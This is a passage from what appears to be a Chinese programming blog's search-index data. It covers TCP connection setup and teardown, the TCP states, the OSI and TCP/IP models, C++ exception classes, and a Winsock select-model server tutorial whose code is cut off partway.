现假定出现一种异常情况，即A发出的第一个连接请求报文段并没有丢失，而是在某些网络节点长时间滞留了，以致延误到连接释放以后的某个时间才到B。本来这是一个已失效的报文段。但是B收到此失效的连接请求报文段后，就误认为是A有发出一次新的连接请求。于是就向A发出确认报文段，同意建立连接。假定不采用三次握手，那么只要B发出确认，新的连接就建立了。 由于现在A并没有发出建立连接的请求，因此不会理睬B的确认，也不会向B发送数据。但B却以为新的运输连接已经建立了，并一直等待A发来数据。B的许多资源就这样拜拜浪费了。 采用三次握手的办法可以防止上述现象的发生。例如在刚才的情况下，A不会向B的确认发出确认。B由于收不到确认，就知道A并没有要求建立连接。 另一种解释： 这个问题的本质是, 信道不可靠, 但是通信双发需要就某个问题达成一致. 而要解决这个问题, 无论你在消息中包含什么信息, 三次通信是理论上的最小值. 所以三次握手不是TCP本身的要求, 而是为了满足&quot;在不可靠信道上可靠地传输信息&quot;这一需求所导致的. 请注意这里的本质需求,信道不可靠, 数据传输要可靠. 三次达到了, 那后面你想接着握手也好, 发数据也好, 跟进行可靠信息传输的需求就没关系了. 因此,如果信道是可靠的, 即无论什么时候发出消息, 对方一定能收到, 或者你不关心是否要保证对方收到你的消息, 那就能像UDP那样直接发送消息就可以了”。这可视为对“三次握手”目的的另一种解答思路。 四次挥手关闭连接 当客户A 没有东西要发送时就要释放 A 这边的连接，A会发送一个报文（没有数据），其中 FIN 设置为1, 服务器B收到后会给应用程序一个信，这时A那边的连接已经关闭，即A不再发送信息（但仍可接收信息）。 A收到B的确认后进入等待状态，等待B请求释放连接， B数据发送完成后就向A请求连接释放，也是用FIN=1 表示， 并且用 ack = u+1(如图）， A收到后回复一个确认信息，并进入 TIME_WAIT 状态， 等待 2MSL 时间。 l 为什么要等待呢？ l 为了防止这种情况：A接到B的释放连接请求后会发送一个确认信息，但是如果这个确认信息丢了，也就是B没有收到确认释放连接，那么B就会重发一个释放连接请求，这时候A还处于TIME_WAIT状态，所以会再次发送一个确认信息。 l Q2为什么TIME_WAIT 状态还需要等2*MSL秒之后才能返回到CLOSED 状态呢？ l A2因为虽然双方都同意关闭连接了，而且握手的4个报文也都发送完毕，按理可以直接回到CLOSED 状态（就好比从SYN_SENT 状态到ESTABLISH 状态那样），但是我们必须假想网络是不可靠的，你无法保证你最后发送的ACK报文一定会被对方收到，就是说对方处于LAST_ACK 状态下的SOCKET可能会因为超时未收到ACK报文，而重发FIN报文，所以这个TIME_WAIT 状态的作用就是用来重发可能丢失的ACK报文。 11种状态 简单解释： l CLOSED：初始状态，表示TCP连接是“关闭着的”或“未打开的”。 l LISTEN ：表示服务器端的某个SOCKET处于监听状态，可以接受客户端的连接。 l SYN_RCVD ：表示服务器接收到了来自客户端请求连接的SYN报文。在正常情况下，这个状态是服务器端的SOCKET在建立TCP连接时的三次握手会话过程中的一个中间状态，很短暂，基本上用netstat很难看到这种状态，除非故意写一个监测程序，将三次TCP握手过程中最后一个ACK报文不予发送。当TCP连接处于此状态时，再收到客户端的ACK报文，它就会进入到ESTABLISHED 状态。 l SYN_SENT ：这个状态与SYN_RCVD 状态相呼应，当客户端SOCKET执行connect()进行连接时，它首先发送SYN报文，然后随即进入到SYN_SENT 状态，并等待服务端的发送三次握手中的第2个报文。SYN_SENT 状态表示客户端已发送SYN报文。 l ESTABLISHED ：表示TCP连接已经成功建立。 l FIN_WAIT_1 ：这个状态得好好解释一下，其实FIN_WAIT_1 和FIN_WAIT_2 两种状态的真正含义都是表示等待对方的FIN报文。而这两种状态的区别是：FIN_WAIT_1状态实际上是当SOCKET在ESTABLISHED状态时，它想主动关闭连接，向对方发送了FIN报文，此时该SOCKET进入到FIN_WAIT_1 状态。而当对方回应ACK报文后，则进入到FIN_WAIT_2 状态。当然在实际的正常情况下，无论对方处于任何种情况下，都应该马上回应ACK报文，所以FIN_WAIT_1 状态一般是比较难见到的，而FIN_WAIT_2 状态有时仍可以用netstat看到。 l FIN_WAIT_2 ：上面已经解释了这种状态的由来，实际上FIN_WAIT_2状态下的SOCKET表示半连接，即有一方调用close()主动要求关闭连接。注意：FIN_WAIT_2 是没有超时的（不像TIME_WAIT 状态），这种状态下如果对方不关闭（不配合完成4次挥手过程），那这个 FIN_WAIT_2 状态将一直保持到系统重启，越来越多的FIN_WAIT_2 状态会导致内核crash。 l TIME_WAIT ：表示收到了对方的FIN报文，并发送出了ACK报文。 TIME_WAIT状态下的TCP连接会等待2*MSL（Max Segment Lifetime，最大分段生存期，指一个TCP报文在Internet上的最长生存时间。每个具体的TCP协议实现都必须选择一个确定的MSL值，RFC 1122建议是2分钟，但BSD传统实现采用了30秒，Linux可以cat /proc/sys/net/ipv4/tcp_fin_timeout看到本机的这个值），然后即可回到CLOSED 可用状态了。如果FIN_WAIT_1状态下，收到了对方同时带FIN标志和ACK标志的报文时，可以直接进入到TIME_WAIT状态，而无须经过FIN_WAIT_2状态。（这种情况应该就是四次挥手变成三次挥手的那种情况） l CLOSING ：这种状态在实际情况中应该很少见，属于一种比较罕见的例外状态。正常情况下，当一方发送FIN报文后，按理来说是应该先收到（或同时收到）对方的ACK报文，再收到对方的FIN报文。但是CLOSING 状态表示一方发送FIN报文后，并没有收到对方的ACK报文，反而却也收到了对方的FIN报文。什么情况下会出现此种情况呢？那就是当双方几乎在同时close()一个SOCKET的话，就出现了双方同时发送FIN报文的情况，这是就会出现CLOSING 状态，表示双方都正在关闭SOCKET连接。 l CLOSE_WAIT ：表示正在等待关闭。怎么理解呢？当对方close()一个SOCKET后发送FIN报文给自己，你的系统毫无疑问地将会回应一个ACK报文给对方，此时TCP连接则进入到CLOSE_WAIT状态。接下来呢，你需要检查自己是否还有数据要发送给对方，如果没有的话，那你也就可以close()这个SOCKET并发送FIN报文给对方，即关闭自己到对方这个方向的连接。有数据的话则看程序的策略，继续发送或丢弃。简单地说，当你处于CLOSE_WAIT 状态下，需要完成的事情是等待你去关闭连接。 l LAST_ACK ：当被动关闭的一方在发送FIN报文后，等待对方的ACK报文的时候，就处于LAST_ACK 状态。当收到对方的ACK报文后，也就可以进入到CLOSED 可用状态了。 CLOSING状态：","categories":[{"name":"计算机网络TCP/IP传输协议/网络抓包","slug":"计算机网络TCP-IP传输协议-网络抓包","permalink":"https://xiaowuyoucy.github.io/categories/计算机网络TCP-IP传输协议-网络抓包/"}],"tags":[]},{"title":"TCP/IP协议模型","slug":"jiw003-TCP-IP协议","date":"2021-06-22T20:51:49.000Z","updated":"2021-06-22T21:52:06.864Z","comments":true,"path":"2021/06/23/jiw003-TCP-IP协议/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/06/23/jiw003-TCP-IP协议/","excerpt":"","text":"TCP/IP协议模型 tcp/ip协议5层 物理层 数据链接层 网络层 传输层 应用层 数据封装和解封装过程","categories":[{"name":"计算机网络TCP/IP传输协议/网络抓包","slug":"计算机网络TCP-IP传输协议-网络抓包","permalink":"https://xiaowuyoucy.github.io/categories/计算机网络TCP-IP传输协议-网络抓包/"}],"tags":[]},{"title":"jiw002-OSI的七层模型","slug":"jiw002-OSI的七层模型","date":"2021-06-22T20:41:52.000Z","updated":"2021-06-22T20:50:39.089Z","comments":true,"path":"2021/06/23/jiw002-OSI的七层模型/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/06/23/jiw002-OSI的七层模型/","excerpt":"","text":"网络工程师： 物理层 1层，通信介质的信号到数字信号（二进制0101） 负责从电信号/光信号/电磁波信号转换到数字信号 或 从数字信号转换到电信号/光信号/电磁波信号 数据链接层 2层 局域网之间计算机通信 通过mac地址通信 arp协议 网络层 3层 IP地址，路由（通过网络访问全世界） 公网的ip地址相当于门牌号（全世界网络互连） ： 私网的ip地址相当于房间号（局域网内部网络互连） 传输层 4层 tcp/udp tcp（可靠，速度慢） udp （不可靠，速度快） 端口（让不同的应用程序，同时使用网络） 开发： 会话层 5层 控制发包的数据 会话层控制传输层，建立三次握手 表示层 6层 文件格式 应用层 7层应用程序使用","categories":[{"name":"计算机网络TCP/IP传输协议/网络抓包","slug":"计算机网络TCP-IP传输协议-网络抓包","permalink":"https://xiaowuyoucy.github.io/categories/计算机网络TCP-IP传输协议-网络抓包/"}],"tags":[]},{"title":"网络的重要性和局域网简介","slug":"jiw001-网络的重要性和局域网简介","date":"2021-06-22T20:34:11.000Z","updated":"2021-06-22T20:41:07.830Z","comments":true,"path":"2021/06/23/jiw001-网络的重要性和局域网简介/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/06/23/jiw001-网络的重要性和局域网简介/","excerpt":"","text":"网络的重要性和局域网简介 网络的重要性：所有的操作系统都有网络！ 教室这么多的电脑如何上网的？ 网卡（mac地址）可以通过MAX地址查询网卡生产厂商 有线（双绞线传播电信号）双向，同时收发 无线（无线电波）发的时候，不能收 交换（扩充网线插槽，让更多的人，在同一个局域网共享上网） 傻瓜交换机（tplink/dlink/水星…） 程控交换机（配置管理，可控思科、华为、华三） 路由（双网卡） 内网卡…-交换机 192.168.16.0/24（192.168.16.1-192.168.16.254） 外网卡 运营商 122.71.64.2（铁通） 查公网ip的方法： windows，打开浏览器，访问百度，搜IP即可 Linux：curl ifconfig.me 扩展：高级路由器还有上网行为管理器和防火墙功能哦 10Mbps==1.25MB 1.1M 100Mbps == 12MR 300KB/s 500KB/s 论坛：鸿鹄论坛（网络工程师） CCNA入门 CCNP广度 CCIE深度 HCIA HCIP HCIE","categories":[{"name":"计算机网络TCP/IP传输协议/网络抓包","slug":"计算机网络TCP-IP传输协议-网络抓包","permalink":"https://xiaowuyoucy.github.io/categories/计算机网络TCP-IP传输协议-网络抓包/"}],"tags":[]},{"title":"标准程序库异常和继承标准程序异常库","slug":"cpp0074-标准程序库异常","date":"2021-06-22T19:38:36.000Z","updated":"2021-06-22T20:18:05.349Z","comments":true,"path":"2021/06/23/cpp0074-标准程序库异常/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/06/23/cpp0074-标准程序库异常/","excerpt":"","text":"标准程序库异常 标准异常类的成员： 在上述继承体系中，每个类都有提供了构造函数、复制构造函数、和赋值操作符重载。 logic_error类及其子类、runtime_error类及其子类，它们的构造函数是接受一个string类型的形式参数，用于异常信息的描述； 所有的异常类都有一个what()方法，返回const char* 类型（C风格字 符串）的值，描述异常信息。 123456789101112131415161718192021222324252627#define _CRT_SECURE_NO_WARNINGS#include&lt;iostream&gt;#include&lt;stdexcept&gt;using namespace std;double mydiv(int x, int y) &#123; if (y == 0) &#123; throw out_of_range(\"除数不能为0\"); &#125; return x / y;&#125;int main(char *argv[], int argc)&#123; try &#123; mydiv(100,0); &#125; catch (out_of_range&amp; oor) &#123; cout &lt;&lt; oor.what() &lt;&lt; endl; &#125; return 0;&#125; 继承标准程序异常基类 继承异常基类需要重写virtual char const* what() const成员函数 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748#define _CRT_SECURE_NO_WARNINGS#include&lt;iostream&gt;#include&lt;exception&gt;using namespace std;class MyException :public exception &#123;public: MyException(const char * error) &#123; pError = new char[strlen(error) + 1]; strcpy(pError,error); &#125; virtual char const* what() const &#123; return pError; &#125; ~MyException() &#123; if (pError != NULL) &#123; delete[] pError; pError = NULL; &#125; &#125;private: char *pError;&#125;;double div(double x,double y) &#123; if (y == 0.0) &#123; throw MyException(\"除数不能为0\"); &#125; return x / y;&#125;int main(char *argv[], int argc)&#123; try &#123; div(100.0,0.0); &#125; catch (exception&amp; oor) &#123; cout &lt;&lt; oor.what() &lt;&lt; endl; &#125; return 0;&#125;","categories":[{"name":"c++","slug":"c","permalink":"https://xiaowuyoucy.github.io/categories/c/"}],"tags":[]},{"title":"select模型","slug":"WS003select模型","date":"2021-06-21T14:48:18.000Z","updated":"2021-06-21T01:36:04.386Z","comments":true,"path":"2021/06/21/WS003select模型/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/06/21/WS003select模型/","excerpt":"","text":"select模型 特点 1、解决基本c/s模型中，accept rcev 傻等的问题 傻等阻塞 执行阻塞 send recv accept 在执行的复制黏贴的过程中都是阻塞的 所以注意，select没模型是解决傻等的问题的，不解决这几个函数本身的阻塞问题，这几个函数本身阻塞的问题，我们接下来的模型会慢慢深入讲解，有五种模型呢~ 2、实现多个客户端链接，与多个客户端分别通信 3、用于服务器，客户端就不用这个了，因为只有一个socket 客户端recv等时候，也不能send啊？ 只需要单独创建一根线程，recv放线程里，就完事儿~ 服务端 网络头文件 网络库 最底层的网络函数，大家用QT MFC wpf，或者百度下载的很多其他的封装好的网络库，都是对咱们讲的这些最本质的网络函数的二次封装，咱们讲的是通用的，讲完这个大家也可以自己封装函数库给别人用了。 #include &lt;WinSock2.h&gt; #pragma comment(lib,“ws2_32.lib”) 函数库 winsock2.h windows socket 第2版 第一版是 winsock.h 查看具体区别 目前网络库有哪些版本？ 1.0 1.1 2.0 2.1 2.2 演示MSDN 查这个函数的详细信息 WSAStartup 我们的开发环境支持哪个版本？ 打开头文件，看咱们当前编译器环境支持的最高版本 ws2_32.lib windows socket 第2版 32位 不管是64编译环境还是32编译环境，都是用这个，并没有ws2_64.dll wsock32.lib winsock.h 第一版网络库 对应的库文件 这里不区分大小写 打开网络库 int WSAStartup( WORD wVersionRequired, LPWSADATA lpWSAData ); 功能 打开网络库/启动网络库，启动了这个库，这个库里的函数/功能才能使用 w windows s socket a Asynchronous 异步 startup 启动 同步与异步 同步 阻塞/卡死状态 异步 多个工作同时进行 参数1 我们要使用的库的版本 类型是 WORD 转定义：unsigned short WORD wVersionRequired = MAKEWORD(2,2); MAKEWORD(主版本,副版本)， 1.0 2.2 wVersionRequired 数据高位/高地址是副版本 数据低位/低地址是主版本 用调试+计算器演示数据原理 位运算，内存操作，小端存储 参数2 LPWSADATA lpWSAData 系统通过这个参数给我们一些配置信息 注意 当看到参数有 LP P前缀的时候，是说我们这里要传对应类型变量的地址，这是win32API 的规范 或者叫规则 看下有哪些信息 struct WSAData { WORD wVersion; WORD wHighVersion; unsigned short iMaxSockets; unsigned short iMaxUdpDg; char *lpVendorInfo; char szDescription[WSADESCRIPTION_LEN + 1]; char szSystemStatus[WSASYS_STATUS_LEN + 1]; } wVersion 我们要使用的版本 wHighVersion 系统能提供给我们最高的版本 iMaxSockets 返回可用的socket的数量，2版本之后就没用了 iMaxUdpDg UDP数据报信息的大小，2版本之后就没用了 lpVendorInfo 供应商特定的信息，2版本之后就没用了 szDescription szSystemStatus 当前库的描述信息，2.0是第二版的意思 当输入的版本不存在 输入1.3， 2.3 有主版本，没有副版本 得到该主版本的最大副版本 1.1 2.2并使用 输入3.1 3.3 超过最大版本号 使用系统能提供的最大的版本 2.2 输入 0.0 0.1 0.3 主版本是0 网络库打开失败，不支持请求的套接字版本 返回值 返回0为执行正确 失败 这些宏的本质 WSASYSNOTREADY 10091 底层网络子系统尚未准备好进行网络通信。 系统配置问题，重启下电脑，检查ws2_32库是否存在，或者是否在环境配置目录下 WSAVERNOTSUPPORTED 10092 此特定Windows套接字实现不提供所请求的Windows套接字支持的版本。 要使用的版本不支持 WSAEPROCLIM 10067 已达到对Windows套接字实现支持的任务数量的限制。 Windows Sockets实现可能限制同时使用它的应用程序的数量 WSAEINPROGRESS 10036 正在阻止Windows Sockets 1.1操作。 当前函数运行期间，由于某些原因造成阻塞，会返回在这个错误码，其他操作均禁止 WSAEFAULT 10014 lpWSAData参数不是有效指针。 参数写错了 校验版本 2 != HIBYTE(wsaData.wVersion) || 2 != LOBYTE(wsaData.wVersion) HIBYTE是高位 副版本 LOBYTE是地位 主版本 逻辑 只要有一个不是2，说明系统不支持我们要的2.2版本 关闭库 并结束函数，可以给出相应提示 WSACleanup(); return 0； 创建SOCKET SOCKET socket( int af, int type, int protocol ); 作用 创建一个SOCKET SOCKET介绍 什么是socket 将底层复杂的协议体系，执行流程，进行了封装，封装完的结果，就是一个SOCKET了， 也就是说，SOCKET是我们调用协议进行通信的 操作接口 意义 将复杂的协议过程与我们编程人员分开，我们直接操作一个简单SOCKET就行了，对于底层的协议 过程细节，完全不用知道，这就大大方便了我们。 网络编程难就难在协议本身的复杂性，简单就简单在我们编程层面完全不用考虑哪些 本质 就是一种数据类型，转定义看下类型 就是一个整数 uint 但是这个数是唯一的 标识着我当前的应用程序，协议特点等信息 ID，门牌号 应用 我们网络通信的函数，全部都要使用SOCKET 演示 逻辑 每个客户端有一个SOCKET，服务器有一个SOCKET，通信时候，就需要这个SOCKET做参数，给谁通信，就要传递谁的SOCKET 所以 网络编程，理论层面SOCKET是网络封装的精华，代码层面就是不停的使用SOCKET这个变量，所以又叫SOCKET编程 参数1 地址的类型 比如大家联系我 手机 15512345678 固定电话 7881234 ＱＱ 40916626 微信 c3_xin666 找上门 内蒙古 xxxxxxx … AF_INET 2 ipv4 Internet协议版本4（IPv4）地址系列。 192.168.1.103 0.0.0.0 ~ 255.255.255.255 点分十进制表示法 4字节 32位的地址 个数快不够 就是无符号int类型的范围 0 ~ 4294967295 AF_INET6 23 ipv6 Internet协议版本6（IPv6）地址系列。 2001:0:3238:DFE1:63::FEFB 16字节 128位的地址 这个地球每寸一个IP AF_BTH 32 蓝牙地址系列。 如果计算机安装了蓝牙适配器和驱动程序，则Windows XP SP2或更高版本支持此地址系列。 6B:2D:BC:A9:8C:12 AF_IRDA 26 红外数据协会（IrDA）地址系列。 仅当计算机安装了红外端口和驱动程序时，才支持此地址系列。 通信地址不仅仅只有IP地址 参数2 套接字类型 SOCK_STREAM 1 一种套接字类型，提供带有OOB数据传输机制的顺序，可靠，双向，基于连接的字节流。 此套接字类型使用传输控制协议（TCP）作为Internet地址系列（AF_INET或AF_INET6）。 SOCK_DGRAM 2 一种支持数据报的套接字类型，它是固定（通常很小）最大长度的无连接，不可靠的缓冲区。 此套接字类型使用用户数据报协议（UDP）作为Internet地址系列（AF_INET或AF_INET6）。 SOCK_RAW 3 一种套接字类型，提供允许应用程序操作下一个上层协议头的原始套接字。 要操作IPv4标头，必须在套接字上设置IP_HDRINCL套接字选项。 要操作IPv6标头，必须在套接字上设置IPV6_HDRINCL套接字选项。 SOCK_RDM 4 一种套接字类型，提供可靠的消息数据报。 这种类型的一个示例是Windows中的实用通用多播（PGM）多播协议实现，通常称为可靠多播节目。 仅在安装了可靠多播协议时才支持此类型值。 SOCK_SEQPACKET 5 一种套接字类型，提供基于数据报的伪流数据包。 参数3 协议的类型 IPPROTO_TCP 传输控制协议（TCP）。 当af参数为AF_INET或AF_INET6且类型参数为SOCK_STREAM时，这是一个可能的值。 IPPROTO_UDP 用户数据报协议（UDP）。 当af参数为AF_INET或AF_INET6且类型参数为SOCK_DGRAM时，这是一个可能的值。 IPPROTO_ICMP Internet控制消息协议（ICMP）。 当af参数为AF_UNSPEC，AF_INET或AF_INET6且类型参数为SOCK_RAW或未指定时，这是一个可能的值。 IPPROTO_IGMP Internet组管理协议（IGMP）。 当af参数为AF_UNSPEC，AF_INET或AF_INET6且类型参数为SOCK_RAW或未指定时，这是一个可能的值。 IPPROTO_RM 用于可靠多播的PGM协议。 当af参数为AF_INET且类型参数为SOCK_RDM时，这是一个可能的值。 在针对Windows Vista及更高版本发布的Windows SDK上，此协议也称为IPPROTO_PGM。 仅在安装了可靠多播协议时才支持此协议值。 整理下 通过参数3得到一个事儿，参数1 2 3三者是配套的，是一套参数，不是随便填的，即使用不同的协议，那要添加对应的那套参数。 想要使用一个协议，咱们设备得支持才行，比如红外 参数3中，有个可能这个词，所以说一般，参数3可以填写0，系统会自动帮我们选择协议类型 返回值 成功返回可用的socket 不用了就一定要销毁套接字 closesocket(socketListen); 失败返回INVALID_SOCKET 关闭网络库 WSACleanup(); 可用WSAGetLasterror()返回错误码 绑定地址与端口 int bind( SOCKET s, const sockaddr *addr, int namelen ); 作用 给我们的socket绑定端口号与具体地址 地址 找到咱们的电脑 只有一个 端口号 找到我们机器上对应的软件，比如QQ，浏览器等等，都对应着自己的端口号 多个 每一种通信的端口号是唯一的 同一个软件可能占用多个端口号 参数1 上一个函数创建了socket，绑定了协议信息（地址类型，套接字类型，协议类型），咱们bind函数就是绑定实质的地址，端口号 参数2 结构体 地址类型 装IP地址 端口号 结构体类型 sockaddr 该参数使用方法 SOCKADDR_IN sockAddress; sockAddress.sin_family = AF_INET; sockAddress.sin_addr.s_addr = inet_addr(“127.0.0.1”); sockAddress.sin_port = 12345; (sockaddr*)&amp;sockAddress强转添加到参数2上 成员1 跟socket函数参数1是一样的 成员2 IP地址 192.168.xxx.xxx 可以在控制台输入指令 ipconfig 就能看到了 或者在网络设置中，能找到这个地址 我就不演示了，我不想让你们发现我 127.0.0.1 回送地址 本地回环地址 本地网络测试 参数3 端口号 本质 就是一个整数 0~65535 IP是我们机器的地址，端口就是我们具体的软件的通信口，一个软件可能会占用多个接口，比如一个软件可以聊天，可以下载，可以看视频…那么这些不同的通信内容，往往会有各自的协议，各自的端口。 IP是公司地址，端口就是各个部门的地址了 填写哪个值呢？ 理论上只要这个范围0~65535都可以 实际 介于0～1023，为系统保留占用端口号 21端口分配给FTP(文件传输协议)服务 25端口分配给SMTP（简单邮件传输协议）服务 80端口分配给HTTP服务 所以 我们不能写这个范围的 我们的范围就是1024~65535 稍微大点儿，1万多 但是注意一点，端口号是唯一的，比如1234已经被别的软件占用了，那么你再使用1234这个端口号，那么就会绑定失败，因为已经呗占用了 给大家演示下 那大家如何查看自己要用的端口号有没有被占用呢？ 打开运行cmd输入netstat -ano 查看被使用的所有端口 netstat -aon|findstr “12345” 检查我们要使用的端口号是否被使用了 使用了就会显示使用的程序，未被使用就啥都不显示 参数3 参数2的类型大小 sizeof(参数2) 返回值 成功返回0 失败返回SOCKET_ERROR 具体错误码通过int WSAGetLastError(void);获得 closesocket(socketListen); WSACleanup(); 开始监听 int WSAAPI listen( SOCKET s, int backlog ); 作用 将套接字置于正在侦听传入连接的状态。 参数1 服务器端的socket，也就是socket函数创建的 参数2 挂起连接队列的最大长度。 就是说，比如有100个用户链接请求，但是系统一次只能处理20个，那么剩下的80个不能不理人家，所以系统就创建个队列记录这些暂时不能处理，一会儿处理的链接请求，依先后顺序处理，那这个队列到底多大？就是这个参数设置，比如2，那么就允许两个新链接排队的。这个肯定不能无限大，那内存不够了。 我们可以手动设置这个参数，但是别大了。可能210多，20多。 我们一般填写这个参数 SOMAXCONN 作用是让系统自动选择最合适的个数 不同的系统环境不一样，所以这个合适的数也都不一样 WSAAPI 调用约定 这个我们可以忽略，这是给系统看的，跟咱们没关 决定三 函数名字的编译方式 参数的入栈顺序 函数的调用时间 返回值 成功 返回0 失败 SOCKET_ERROR 具体错误码 WSAGetLastError() 释放 closesocket(socketListen); WSACleanup(); select 逻辑 1、每个客户端都有socket，服务器也有自己的socket，将所有的socket装进一个数据结构里，即数组 两种 2、通过select函数，遍历1中的socket数组，当某个socket有响应，select就会通过其参数/返回值反馈出来。 我们就做相应处理 3、我们就做相应处理 如果检测到的是服务器socket 那就是有客户端链接 调用accept 如果检测到的是客户端socket 那就是客户端请求通信 send或者recv 第一步 定义一个装客户端socket结构 fd_set clientSet; fd_set网络定义好的专门给咱们用的 转定义看下fd_set的声明 64 默认FD_SETSIZE是64, 大家可以在Winsock2.h前声明这个宏，给他更大的值，他就更大了，不要过大 因为原理就是不听的遍历检测，越多肯定效率越低，延迟越大，所以大家尽量不要太大，几百个，1024就差不多了，当然大家不怕慢，可以设置更多~ 所以，select模型应用，就是小用户量访问量，几十几百，简单方便。 四个操作fd_set的参数宏 依次转定义看下逻辑 FD_ZERO 讲集合清0 FD_ZERO(&amp;clientSet); FD_SET 向集合中添加一个socket 当数量不足64，并且不存在的时候 FD_SET(socket, &amp;setRead); FD_CLR 结合中删除指定socket FD_CLR(socket, &amp;setRead); 我们要手动释放 FD_ISSET 判断一个socket是否在集合中 不在返回0 在返回非0 FD_ISSET(socket, &amp;setRead) 第二步 select 作用 监视socket集合，如果某个socket发生事件（链接或者收发数据），通过返回值以及参数告诉我们 函数原型 int WSAAPI select ( int nfds, fd_set *readfds, fd_set *writefds, fd_set *exceptfds, const timeval *timeout ); 参数1 忽略 填0 这个参数仅仅是为了兼容Berkeley sockets. 参数2 检查是否有可读的socket 即客户端发来消息了，该socket就会被设置 &amp;setRead 初始化为所有的socket，通过select投放给系统，系统将有事件发生的socket再赋值回来，调用后，这个参数就只剩下有请求的socket 参数3 检查是否有可写的socket 就是可以给哪些客户端套接字发消息，即send 只要链接成功建立起来了，那该客户端套接字就是可写的 &amp;setWrite 初始化为所有的socket，通过select投放给系统，系统将可写的socket再赋值回来，调用后，这个参数就是装着可以被send数据的客户端socket 一般我们就直接send了，所以这个参数逻辑上，用的不是非常多 参数4 检查套接字上的异常错误 用法跟2 3一样 将有异常错误的套接字重新装进来，，反馈给我们 得到异常套接字上的具体错误码 getsockopt （socket，SOL_SOCKET， SO_ERROR, buf , buflen） 错误信息通过参数4返给我们 参数5 最大等待时间 比如当客户端没有请求时，那么select函数可以等一会儿，一段时间过后，还没有，就继续执行select下面的语句，如果有了，就立刻执行下面的语句 TIMEVAL 两个成员 tv_sec 秒 tv_usec 微秒 0 0 非阻塞状态，立刻返回 3 4 那就再无客户端响应的情况下等待3秒4微秒 NULL select完全阻塞 直到客户端有反应，我才继续 返回值 0 客户端在等待时间内没有反应 处理 continue就行了 0 有客户端请求交流了 SOCKET_ERROR 发生了错误 得到错误码WSAGetLastError() 第四步 0处理 客户端socket有事件 可读的 遍历响应socket集合 如果是socketServer accept 客户端socket recv 0 客户端正常下线 要在socket集合中删除对应的客户端socket 0 客户端发来了消息，buf中 socket_error 客户端有错误发生 可写的 调用send 成功返回发送的字节数 失败返回socket_error WSAGetLastError的到错误码 有异常的 getsockopt （socket，SOL_SOCKET， SO_ERROR, buf , buflen） 作用 将socket上产生的异常，通过参数4返回给咱们 返回值 成功返回0 失败返回sock_error WSAGetLastError得到错误码 总结 代码结构 select模型的代码，也会有细节优化的，结构稍有变化的，但是原理都一样，咱们讲的就是最笨，思路最简单的方法，让大家理解这个模型的处理本质 结构核心 参数2 处理accept与recv傻等的问题 这是select结构对比基本模型的最大的作用 所以大家看网上的一些代码，基本都是只有参数2，参数3，4都是NULL 参数3 send随时都能发，并不一定由参数3决定send 流程总结 socket集合 select判断有没有响应的 返回0：没有，继续挑 返回&gt;0：有响应的 可读的 accept recv 可写的 send 不是非得从此处调用send 异常的 getsockopt sock_error select是阻塞的 不等待 执行阻塞 半等待 执行阻塞+软阻塞 全等待 执行阻塞+硬阻塞 死等 释放socket 释放所有socket 控制台点x退出 主函数投递一个监视 SetConsoleCtrlHandler(HandlerRoutine, FALSE); 处理函数 BOOL WINAPI HandlerRoutine(DWORD dwCtrlType ) { switch (dwCtrlType) { case CTRL_CLOSE_EVENT: { 释放socket; } } return TRUE; } 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196// select.cpp : 定义控制台应用程序的入口点。//#include \"stdafx.h\"#include&lt;iostream&gt;#define FD_SETSIZE 1024#include&lt;WinSock2.h&gt;#include&lt;windows.h&gt;#pragma comment(lib,\"ws2_32.lib\")using namespace std;SOCKET serverSocket;fd_set allSocket;BOOL WINAPI ExitFun(DWORD dwCtrlType) &#123; switch (dwCtrlType) &#123; case CTRL_CLOSE_EVENT: FD_CLR(serverSocket, &amp;allSocket); for (u_int i = 0; i &lt; allSocket.fd_count; i++) &#123; closesocket(allSocket.fd_array[i]); &#125; FD_ZERO(&amp;allSocket); closesocket(serverSocket); WSACleanup(); break; &#125; return TRUE;&#125;int main(int argc, char *argv[])&#123; SetConsoleCtrlHandler(ExitFun, TRUE); WORD wdVersion = MAKEWORD(2, 2); WSADATA wdSockMsg; int nRes = WSAStartup(wdVersion, &amp;wdSockMsg); if (0 != nRes) &#123; cout &lt;&lt; \"WSAStartup Error\" &lt;&lt; endl; return 0; &#125; if (HIBYTE(wdSockMsg.wVersion) != 2 || LOBYTE(wdSockMsg.wVersion) != 2) &#123; WSACleanup(); cout &lt;&lt; \"网络库版本出错\" &lt;&lt; endl; return 0; &#125; serverSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP); if (serverSocket == INVALID_SOCKET) &#123; cout &lt;&lt; \"socket Error: \" &lt;&lt; WSAGetLastError() &lt;&lt; endl; WSACleanup(); return 0; &#125; sockaddr_in si; si.sin_family = AF_INET; si.sin_port = htons(12346); si.sin_addr.S_un.S_addr = inet_addr(\"192.168.1.103\"); if (SOCKET_ERROR == bind(serverSocket, (sockaddr *)&amp;si, sizeof(si))) &#123; cout &lt;&lt; \"bind Error: \" &lt;&lt; WSAGetLastError() &lt;&lt; endl; closesocket(serverSocket); WSACleanup(); return 0; &#125; if (SOCKET_ERROR == listen(serverSocket,SOMAXCONN)) &#123; cout &lt;&lt; \"listen Error: \" &lt;&lt; WSAGetLastError() &lt;&lt; endl; closesocket(serverSocket); WSACleanup(); return 0; &#125; //初始化allSocket变量 FD_ZERO(&amp;allSocket); //将服务器套接字添加到allSocket中 FD_SET(serverSocket,&amp;allSocket); while (true) &#123; //设置等待时间 TIMEVAL waitTime; waitTime.tv_sec = 3; waitTime.tv_usec = 0; //使用临时的fd_set变量,防止被覆盖掉 fd_set readAllSocket = allSocket; fd_set writeAllSocket = allSocket; fd_set exAllSocket = allSocket; //进入select,将有消息的套接字选出来 int nStRes = select(0, &amp;readAllSocket, &amp;writeAllSocket, &amp;exAllSocket, &amp;waitTime); //没有消息 if (nStRes == 0) &#123; continue; &#125; //有消息 else if (nStRes &gt; 0) &#123; //处理有请求的套接字 for (u_int i = 0; i &lt; readAllSocket.fd_count; i++) &#123; //如果是服务器套接字,说明有accept请求 if 